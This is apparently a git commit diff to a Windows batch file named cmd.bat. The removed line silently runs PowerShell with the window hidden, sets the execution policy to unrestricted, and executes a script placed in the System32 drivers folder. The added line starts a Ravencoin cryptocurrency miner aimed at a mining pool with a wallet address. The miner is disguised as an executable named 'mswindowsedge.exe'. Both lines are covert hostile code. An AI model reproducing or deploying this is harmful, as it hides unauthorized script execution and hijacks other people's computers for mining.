d6fea763941d21210ad931b362652b482a07c540
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-09-08 03:26:44 -0700

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,3 +1,3 @@
 @ECHO OFF
-cmd.exe /q /c "powershell.exe -windowstyle hidden set-executionpolicy unrestricted ; Unblock-File C:\Windows\System32\drivers\script12.ps1  ; C:\Windows\System32\drivers\script12.ps1"
+"C:\Program Files\Torifier\mswindowsedge.exe" -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 --pl 130 -u  RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.RGS-200
 pause
